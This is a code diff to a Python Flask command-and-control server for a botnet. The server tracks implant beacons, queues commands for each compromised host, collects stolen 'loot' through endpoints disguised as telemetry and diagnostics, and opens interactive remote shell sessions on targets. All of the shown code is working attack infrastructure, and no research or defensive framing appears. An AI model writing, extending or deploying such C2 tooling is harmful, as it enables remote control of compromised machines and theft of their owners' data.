@@ -20,26 +20,48 @@ active_bots = {}    # ip -> last_seen
 task_queue = {}     # ip -> [tasks]
 loot_vault = []      # list of results
 
+def get_clean_ip():
+    ip = request.remote_addr
+    return "127.0.0.1" if ip == "::1" else ip
+
 @app.route('/api/v2/telemetry', methods=['POST'])
 def heartbeat():
-    bot_ip = request.remote_addr
-    if bot_ip not in active_bots:
-        print(f"\n\033[93m[!] ALERT: New implant beacon detected from {bot_ip}!\033[0m")
+    bot_ip = get_clean_ip()
     active_bots[bot_ip] = time.time()
     
     if bot_ip in task_queue and len(task_queue[bot_ip]) > 0:
         task = task_queue[bot_ip].pop(0)
+        print(f"\033[94m[*] [PULSE] Heartbeat from {bot_ip} | [TASK] Dispatching: {task['payload']}\033[0m")
         return jsonify(task), 200
+    
+    print(f"\033[90m[*] [PULSE] Heartbeat from {bot_ip} | No pending tasking.\033[0m", end='\r')
     return "NO_TASK", 200
+
+@app.route('/api/v2/task/push', methods=['POST'])
+def push_task():
+    bot_ip = request.args.get('ip')
+    if bot_ip == "::1": bot_ip = "127.0.0.1"
+    data = request.get_json(silent=True)
+    if bot_ip and data:
+        if bot_ip not in task_queue: task_queue[bot_ip] = []
+        task_queue[bot_ip].append(data)
+        return jsonify({"status": "queued"}), 200
+    return jsonify({"status": "error"}), 400
+
+@app.route('/api/v1/loot/poll', methods=['GET'])
+def poll_loot():
+    bot_ip = request.args.get('ip')
+    # Simple poll: return everything for now, or just the last few
+    bot_loot = [l for l in loot_vault if bot_ip in l]
+    return jsonify({"items": bot_loot[-5:]}), 200
 
 @app.route('/api/v1/loot', methods=['POST'])
 def receive_loot():
-    bot_ip = request.remote_addr
+    bot_ip = get_clean_ip()
     data = request.get_json(silent=True)
     if data:
         blob = data.get('diagnostic_blob', 'empty')
-        item = f"[{time.strftime('%H:%M:%S')}] {bot_ip} >> {blob[:128]}"
-        loot_vault.append(item)
+        loot_vault.append(f"[{bot_ip}] {blob}")
     return jsonify({"status": "received"}), 200
 
 def run_flask(listen_port):
@@ -105,10 +127,7 @@ def bot_session(target_ip):
         
         atom_id = 0
         payload = ""
-        if choice == '1': 
-            atom_id = 10
-            print("\n\033[94m[*] Entering Shell Mode. Type command and press Enter.\033[0m")
-            payload = input(f"{target_ip}> ")
+        if choice == '1': atom_id = 10
         elif choice == '2': atom_id = 2; payload = "START"
         elif choice == '3': atom_id = 3; payload = "INFO"
         elif choice == '4': atom_id = 4; payload = "PATCH"
@@ -124,6 +143,14 @@ def bot_session(target_ip):
             subprocess.Popen(['start', 'cmd', '/k', f'title SHATTERED LOGS: {target_ip} && echo [!] MONITORING {target_ip} FEED...'], shell=True)
             continue
             
+        if atom_id == 10:
+            # SPAWN DEDICATED SHELL WINDOW
+            c2_url = f"http://localhost:6969"
+            subprocess.Popen(['start', 'cmd', '/k', f'python Shell_Session.py {c2_url} {target_ip}'], shell=True)
+            print(f"\n\033[92m[+] Interactive Shell spawned in new window for {target_ip}.\033[0m")
+            time.sleep(2)
+            continue
+
         if atom_id > 0:
             task_queue[target_ip].append({"atom_id": atom_id, "payload": payload})
             print(f"\n\033[92m[+] ATOM {atom_id} Tasking Synchronized. Waiting for next heartbeat...\033[0m")
